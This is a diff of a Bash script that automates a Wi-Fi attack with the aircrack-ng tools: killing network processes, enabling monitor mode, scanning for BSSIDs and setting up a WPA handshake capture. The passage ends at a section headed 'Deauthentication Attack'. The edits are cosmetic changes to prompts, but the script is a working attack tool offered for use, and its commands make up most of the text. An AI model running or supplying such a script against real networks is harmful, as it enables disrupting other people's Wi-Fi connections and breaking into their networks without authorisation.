@@ -3,35 +3,35 @@
 # Kill processes
 sudo airmon-ng check kill
 
-echo "Enter network interface: "
+echo -n "Enter network interface: "
 read interface
 
 # Start monitor mode
 sudo airmon-ng start $interface
 
 # See network config
-iwconfig
+# iwconfig
 
 
-echo "Enter name of the interface that is on monitor mode: "
+echo -en "\nEnter name of the interface that is on monitor mode: "
 read interface
 
-echo "Enter \"q\" two times to quite from capturing BSSID"
+echo -n "Enter \"q\" two times to quite from capturing BSSID: "
 sleep 1
 
 # Capturing BSSID
 sudo airodump-ng $interface
 
-echo "Enter BSSID : "
+echo -en "\nEnter BSSID : "
 read bssid
 
-echo "Enter Channel number: "
+echo -n "Enter Channel number: "
 read c
 
-echo "Enter file name save captured files: "
+echo -n "Enter file name save captured files: "
 read filename
 
-echo "Enter \"q\" two times to quite after capture Handshake"
+echo -n "Enter \"q\" two times to quite after capture Handshake"
 sleep 1
 
 # Deauthentication Attack
